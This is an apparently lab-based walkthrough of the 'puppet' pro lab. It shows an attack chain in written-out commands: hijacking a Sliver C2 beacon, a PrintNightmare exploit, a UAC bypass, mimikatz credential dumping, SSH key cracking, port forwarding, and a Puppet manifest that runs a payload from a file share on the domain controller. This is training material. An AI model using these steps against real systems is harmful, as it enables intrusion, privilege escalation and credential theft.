# puppet (mine pro lab)

### Lab Infrastructure <a href="#id-7eeb" id="id-7eeb"></a>

```
PUPPET-PM01      Linux (Master)
PUPPET-DC01      Windows (Domain Controller)
PUPPET-FILE01    Windows (File Server)
```

### Reconnaissance <a href="#id-852b" id="id-852b"></a>

#### Initial Enumeration <a href="#id-06b4" id="id-06b4"></a>

{% code title="" expandable="true" %}
```shellscript
nmap -Pn -sC -sV 10.13.38.33
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/01 (36).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
* **21/tcp** — vsftpd 3.0.5 (anonymous FTP enabled)
* **22/tcp** — OpenSSH
* **8443/tcp** — Sliver C2 server (HTTPS)
* **31337/tcp** — Elite (C2 port)
{% endhint %}

#### FTP Discovery <a href="#b833" id="b833"></a>

{% code title="" expandable="true" %}
```
ftp 10.13.38.33
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/02 (39).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Finding: The configuration file contained <mark style="color:$danger;">`localhost:31337`</mark>, indicating the C2 server
{% endhint %}

<figure><img src="../../../.gitbook/assets/03 (33).png" alt=""><figcaption></figcaption></figure>

### Initial Access via C2 <a href="#bcce" id="bcce"></a>

**Step 1:** Set up socat relay from attack machine to internal C2 serverس



{% code title="" expandable="true" %}
```shellscript
sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/04 (30).png" alt=""><figcaption></figcaption></figure>

**Step 2 :** Import the configuration and connect to Sliver

{% code title="" expandable="true" %}
```
./sliver-client_linux import red_127.0.0.1.cfg
./sliver-client_linux
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/05 (24).png" alt=""><figcaption></figcaption></figure>

Step 3 : Running the `beacons and sessions` command shows that a beacon is already connected

{% code title="" expandable="true" %}
```
beacons
sessions
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/07 (12).png" alt=""><figcaption></figcaption></figure>

Step 4 : interactive with sessions

<figure><img src="../../../.gitbook/assets/08 (12).png" alt=""><figcaption></figcaption></figure>

**Step 5:** Locate the first flag

{% code title="" expandable="true" %}
```shellscript
execute -o -- cmd.exe /c dir "C:\Users\Bruce.Smith\Desktop"
execute -o -- cmd.exe /c type "C:\Users\Bruce.Smith\Desktop\flag.txt"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/09 (10).png" alt=""><figcaption></figcaption></figure>

***

### Local Privilege Escalation

Step 1 : show the current privilege

{% code title="" expandable="true" %}
```shellscript
execute -o -- cmd.exe /c whoami /all
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/001 (14).png" alt=""><figcaption></figcaption></figure>

Step 2 : Ran PrivescCheck to enumerate local privilege escalation

{% code title="" expandable="true" %}
```shellscript
armory install -c sharpsh
sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/003 (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/004 (6).png" alt=""><figcaption></figcaption></figure>

#### Exploitation: PrintNightmare (CVE-2021–1675) <a href="#id-24e2" id="id-24e2"></a>

**Step 2:** Execute the exploit to create a local admin user

{% code title="" expandable="true" %}
```shellscript
execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". c:\users\bruce.smith\Documents\CVE-2021-34527.ps1; Invoke-Nightmare -NewUser ITadmin -NewPassword P@ssw0rd"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/001 (15).png" alt=""><figcaption></figcaption></figure>

**Step 3 :** Spawn a beacon as the new admin user

{% code title="" expandable="true" %}
```shellscript
runas -u ITadmin -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/002 (12).png" alt=""><figcaption></figcaption></figure>

#### UAC Bypass to SYSTEM <a href="#f1e0" id="f1e0"></a>

{% code title="" expandable="true" %}
```shellscript
upload /home/kali/.sliver-client/extensions/UAC-BOF-Bonanza/SspiUacBypass/bin/standalone/SspiUacBypass.exe "C:\temp\SspiUacBypass.exe"
execute -o -- "c:\temp\SspiUacBypass.exe" "c:\programdata\puppet\puppet-update.exe"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/000 (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/beacon.png" alt=""><figcaption></figcaption></figure>

#### Credential Dumping <a href="#id-7c52" id="id-7c52"></a>

With SYSTEM privileges:

{% code title="" expandable="true" %}
```
armory install windows-credentials
sideload /home/xct/drop/mimikatz.exe "token::elevate privilege::debug sekurlsa::logonpasswords exit"
mimikatz privilege::debug sekurlsa::logonpasswords exit

```
{% endcode %}

<figure><img src="../../../.gitbook/assets/004 (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/003 (11).png" alt=""><figcaption></figcaption></figure>

### Lateral Movement via Service Account <a href="#id-264d" id="id-264d"></a>

#### Migrate to Service Process <a href="#id-5644" id="id-5644"></a>

{% code title="" expandable="true" %}
```shellscript
ps
migrate -p 3580
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/ps.png" alt=""><figcaption></figcaption></figure>

Enumerations sharing file on dc

{% code title="" expandable="true" %}
```shellscript
sa-netshares dc01
ls "\\dc01.puppet.vl\it"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/enum.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
#### Download SSH Key and crack the passphrase <a href="#id-55ee" id="id-55ee"></a>
{% endhint %}

{% code title="" expandable="true" %}
```shellscript
ssh2john ed25519 > ed25519.hash
john ed25519.hash --wordlist=/home/kali/rockyou_utf8.txt 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/ssh.png" alt=""><figcaption></figcaption></figure>

#### SSH Access to Puppet Server <a href="#d303" id="d303"></a>

* Set up port forwarding through the Sliver beacon:

{% code title="" expandable="true" %}
```shellscript
portfwd add --bind 2222 -r 172.16.40.200:22
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/portfwd.png" alt=""><figcaption></figcaption></figure>

Connect via SSH:

{% code title="" expandable="true" %}
```shellscript
ssh -i ed25519 -p 2222 "svc_puppet_lin_t1@puppet.vl"@127.0.0.1
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/0000.png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation on Puppet Server <a href="#b95b" id="b95b"></a>

Check sudo permissions:

{% code title="" expandable="true" %}
```shellscript
sudo -l 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/2222 (2).png" alt=""><figcaption></figcaption></figure>









{% code title="" expandable="true" %}
```
mkdir -p /etc/puppet/code/environments/production/manifests
chmod 777 /etc/puppet/code/environments/production/manifests
nano /etc/puppet/code/environments/production/manifests/site.pp
chmod 777 /etc/puppet/code/environments/production/manifests/site.pp
node 'dc01.puppet.vl' {
  exec { 'pwned':
    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\puppet-update.exe',
    logoutput => true,
  }
}
node default {
  notify { 'This is the default node': }
}

puppet apply /etc/puppet/code/environments/production/manifests/site.pp 

```
{% endcode %}

<figure><img src="../../../.gitbook/assets/root to dc.png" alt=""><figcaption></figcaption></figure>
